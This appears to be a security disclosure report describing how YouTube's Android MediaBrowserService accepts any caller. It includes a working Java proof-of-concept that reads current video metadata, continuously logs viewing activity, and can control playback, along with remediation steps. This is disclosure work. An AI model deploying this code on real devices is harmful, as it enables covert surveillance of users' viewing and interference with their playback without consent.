# VRP Report #36: YouTube MediaBrowserService Zero-Permission Privacy Leak

## Vulnerability Summary

YouTube's `MainAppMediaBrowserService` is exported without any permission requirement. Any installed app can connect via the standard `MediaBrowser` API and obtain YouTube's `MediaSession` token. This grants a zero-permission attacker the ability to:
- **Read the user's currently playing video** (title, channel, thumbnail URI) — leaking private viewing activity
- **Control playback** (play, pause, stop, skip, seek) — disrupting the user experience
- **Monitor state changes in real-time** — building a continuous surveillance log of YouTube usage

## Affected Component

| Attribute | Value |
|-----------|-------|
| Package | `com.google.android.youtube` |
| Service | `com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService` |
| Exported | `true` |
| Permission | **NONE** |
| Intent Filter | `android.media.browse.MediaBrowserService` |

## Technical Details

### Manifest Declaration

```xml
<service android:exported="true"
  android:name="com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService">
  <intent-filter>
    <action android:name="android.media.browse.MediaBrowserService"/>
  </intent-filter>
</service>
```

No `android:permission` attribute is declared.

### Access Control in onGetRoot()

```java
// MainAppMediaBrowserService.java — onGetRoot equivalent
@Override
public final cun b(String callerPackage) {
    if (callerPackage.equals("com.android.systemui")) {
        return null;          // ONLY SystemUI is blocked
    }
    return new cun(null);    // ALL other callers accepted — including malicious apps
}
```

The ONLY access control is a blocklist for `com.android.systemui`. Every other package on the device — including zero-permission third-party apps — receives a non-null root, granting a successful connection.

### MediaSession Token Exposure

On successful connection, the service exposes its `MediaSession` token through `onCreate()`:

```java
@Override
public final void onCreate() {
    super.onCreate();
    ff ffVar = (ff) this.g.e.mM();
    ffVar.n();
    fe feVarC = ffVar.c();     // Gets the active MediaSession token
    // Sets session token on the service — accessible to all connected clients
}
```

With the `MediaSessionCompat.Token`, the attacker creates a `MediaControllerCompat` and gains full read/write access to the media session.

## Impact

### Confidentiality (HIGH)
- **Viewing activity leak**: Any app can read the currently playing video's title, channel name, album art URI, duration, and playback position — revealing what the user is watching on YouTube at any moment
- **Continuous surveillance**: By registering a `MediaController.Callback`, a background app can build a complete log of the user's YouTube viewing history without any visible indicator or permission request
- **Metadata includes**: Video title, channel/artist name, thumbnail/art URI, duration, current position, playback state

### Integrity (MEDIUM)
- **Playback control**: Attacker can pause, play, stop, skip, or seek — disrupting the user's viewing experience
- **Custom commands**: TransportControls may expose additional service-specific actions

### No Permissions Required
The attacking app requires ZERO Android permissions — no `READ_MEDIA_*`, no `INTERNET`, no notification access. Just a `MediaBrowser.connect()` call.

## Proof of Concept

```java
public class YouTubeSpyActivity extends Activity {
    private MediaBrowserCompat browser;
    private MediaControllerCompat controller;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // ... UI setup ...

        browser = new MediaBrowserCompat(this,
            new ComponentName("com.google.android.youtube",
                "com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService"),
            new MediaBrowserCompat.ConnectionCallback() {
                @Override
                public void onConnected() {
                    MediaSessionCompat.Token token = browser.getSessionToken();
                    controller = new MediaControllerCompat(YouTubeSpyActivity.this, token);

                    // READ: Current video metadata
                    MediaMetadataCompat metadata = controller.getMetadata();
                    if (metadata != null) {
                        String title = metadata.getString(MediaMetadataCompat.METADATA_KEY_TITLE);
                        String artist = metadata.getString(MediaMetadataCompat.METADATA_KEY_ARTIST);
                        long duration = metadata.getLong(MediaMetadataCompat.METADATA_KEY_DURATION);
                        log("LEAKED: User watching: " + title + " by " + artist);
                    }

                    // MONITOR: Continuous surveillance via callback
                    controller.registerCallback(new MediaControllerCompat.Callback() {
                        @Override
                        public void onMetadataChanged(MediaMetadataCompat metadata) {
                            String title = metadata.getString(MediaMetadataCompat.METADATA_KEY_TITLE);
                            log("USER SWITCHED TO: " + title);
                        }
                        @Override
                        public void onPlaybackStateChanged(PlaybackStateCompat state) {
                            log("Playback state: " + state.getState() + " pos=" + state.getPosition());
                        }
                    });

                    // CONTROL: Disrupt playback
                    // controller.getTransportControls().pause();
                    // controller.getTransportControls().skipToNext();
                }
            }, null);
        browser.connect();
    }
}
```

## Affected Devices

All Android devices with YouTube installed. Tested build: CP2A.260605.012 (Android 17, Pixel 6a).

## Remediation Recommendations

1. Add a signature-level permission to the service declaration:
   ```xml
   <service android:exported="true"
     android:permission="com.google.android.youtube.permission.MEDIA_SESSION">
   ```
2. Implement proper caller verification in `onGetRoot()` using `packageManager.checkSignatures()` to restrict to trusted media controllers (e.g., Android Auto, Wear OS, Google Assistant)
3. Convert the SystemUI blocklist to an allowlist of approved callers

## References

- Android MediaBrowserService documentation: apps.get MediaSession token on connect
- Similar: CVE-2023-20963 (Android media session token exposure precedent)
- Google VRP: information disclosure without user consent
